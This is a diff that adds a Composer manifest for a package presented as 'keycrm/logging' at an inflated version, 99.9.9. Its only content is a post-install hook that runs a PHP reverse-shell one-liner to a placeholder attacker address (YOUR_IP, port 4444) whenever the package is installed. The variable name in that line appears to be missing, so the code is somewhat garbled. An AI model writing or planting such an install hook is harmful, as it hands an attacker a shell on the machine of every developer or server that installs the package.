@@ -1,0 +1,9 @@
+{
+    "name": "keycrm/logging",
+    "version": "99.9.9",
+    "scripts": {
+        "post-install-cmd": [
+            "php -r '\=fsockopen(\"YOUR_IP\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+        ]
+    }
+}
